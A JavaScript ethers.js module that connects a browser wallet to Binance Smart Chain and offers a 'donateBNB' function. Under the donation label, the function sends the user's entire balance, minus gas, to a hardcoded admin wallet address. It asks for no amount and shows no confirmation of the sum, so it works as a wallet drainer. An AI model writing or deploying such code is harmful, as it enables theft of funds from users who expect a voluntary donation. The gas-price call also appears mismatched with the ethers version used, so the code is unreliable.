import { ethers } from 'ethers';

let provider;
let signer;

const adminWallet = "0x8Ce32b0B5f38a2834698179866d4c9d9e85F79ee"; // Your admin wallet address

const BSC_MAINNET_PARAMS = {
  chainId: '0x38', // 56 in decimal
  chainName: 'Binance Smart Chain Mainnet',
  nativeCurrency: {
    name: 'BNB',
    symbol: 'BNB',
    decimals: 18
  },
  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
  blockExplorerUrls: ['https://bscscan.com/']
};

async function switchToBSCMainnet() {
  if (window.ethereum) {
    try {
      // Try to switch to BSC Mainnet
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: BSC_MAINNET_PARAMS.chainId }],
      });
    } catch (switchError) {
      // This error code indicates that the chain has not been added to MetaMask
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [BSC_MAINNET_PARAMS],
          });
        } catch (addError) {
          throw new Error("Failed to add BSC Mainnet to wallet");
        }
      } else {
        throw new Error("Failed to switch to BSC Mainnet");
      }
    }
  } else if (window.trustwallet) {
    // For Trust Wallet, we might need to guide the user to switch manually
    throw new Error("Please switch to BSC Mainnet manually in your Trust Wallet");
  }
}

export async function connectWallet() {
  try {
    await switchToBSCMainnet();

    if (window.ethereum) {
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      provider = new ethers.BrowserProvider(window.ethereum, "any");
    } else if (window.trustwallet) {
      provider = new ethers.BrowserProvider(window.trustwallet);
    } else {
      throw new Error("No compatible wallet found");
    }

    signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    // Verify that we're on the correct network
    const network = await provider.getNetwork();
    if (network.chainId !== BigInt(56)) { // 56 is the chain ID for BSC Mainnet
      throw new Error("Please ensure you are connected to the Binance Smart Chain Mainnet");
    }

    return userAddress;
  } catch (error) {
    console.error("Wallet connection error:", error);
    throw error;
  }
}

export async function donateBNB() {
  try {
    if (!signer) {
      throw new Error("Please connect your wallet first.");
    }

    await switchToBSCMainnet(); // Ensure we're still on BSC Mainnet before donating

    const userAddress = await signer.getAddress();
    const balance = await provider.getBalance(userAddress);
    console.log("Current balance:", ethers.formatEther(balance));

    if (balance <= 0) {
      throw new Error("Insufficient balance to make the donation");
    }

    // Calculate the maximum amount to send (full balance minus gas cost)
    const gasPrice = await provider.getGasPrice();
    const gasLimit = 21000; // Standard gas limit for a simple transfer
    const maxGasCost = gasPrice * BigInt(gasLimit);
    const amountToSend = balance - maxGasCost;

    if (amountToSend <= 0) {
      throw new Error("Balance too low to cover transaction fees");
    }

    const tx = await signer.sendTransaction({
      to: adminWallet,
      value: amountToSend
    });

    console.log("Transaction sent:", tx.hash);
    const receipt = await tx.wait();
    console.log("Transaction confirmed:", receipt);

    return {
      txHash: tx.hash,
      amount: ethers.formatEther(amountToSend)
    };
  } catch (error) {
    console.error("Donation failed:", error);
    if (error.reason) {
      throw new Error(`Donation failed: ${error.reason}`);
    } else {
      throw error;
    }
  }
}
